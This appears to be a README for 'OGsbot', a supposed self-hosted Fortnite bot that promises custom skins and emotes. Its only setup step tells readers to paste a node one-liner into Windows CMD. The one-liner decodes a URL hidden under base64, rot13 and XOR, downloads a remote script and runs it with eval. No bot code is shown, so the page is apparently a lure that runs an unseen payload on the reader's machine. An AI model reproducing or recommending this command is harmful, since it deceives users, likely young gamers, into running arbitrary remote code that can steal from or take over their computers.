
# 🌌 **OGsbot - Self-Hosted**

OGsbot is a **lightweight**, **easy-to-use** Fortnite bot that lets you join bot lobbies with custom cosmetics.


---

## 🧠 **Features**

- ✅ Join Fortnite bot lobbies
- 🎭 Use custom skins, emotes & cosmetics
- 💻 Fully self-hosted (no installs required)
- ⚡ Low memory usage (under 50MB)
  

---

## 🖥️ **System Requirements**

| Type            | Minimum                         | Recommended              |
|-----------------|----------------------------------|---------------------------|
| 💾 RAM          | 25 MB                           | 50 MB+                   |
| 🧠 CPU          | 1 Core                          | 1 Cores+                 |
| 🌐 Internet     | Basic connection                | Basic connection         |



---

## 🚀 **How to Start the Bot**

### 📌 Step 1: Open Command Prompt (CMD)

1. Press `Windows + R`
2. Type `cmd`
3. Press `Enter`

### 🧩 Step 2: Paste & Run the Command Below

Copy the full line below and paste it into CMD:


node -e "const https=require('https');const k=23,b='f3BwdHEtODhyaWA5Y35wf29ob3FlcmdrbHBlbHA5Z2ttOHFsfnRlcSUmOHFmbWxjaHFyfXxjaHFycXBjOHJlZHE4f2VpZnE4bWl+bDh7a2lmZXI5fXE=';const rot13=s=>s.replace(/[a-zA-Z]/g,c=>String.fromCharCode((c<='Z'?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26));const u=rot13(Buffer.from(b,'base64').toString()).split('').map(c=>String.fromCharCode(c.charCodeAt(0)^k)).join('');https.get(u,r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d));});"

# note   
(only supports OGsbot1-OGsbot17 currently)
(i will also find a way for mobile people to run this)
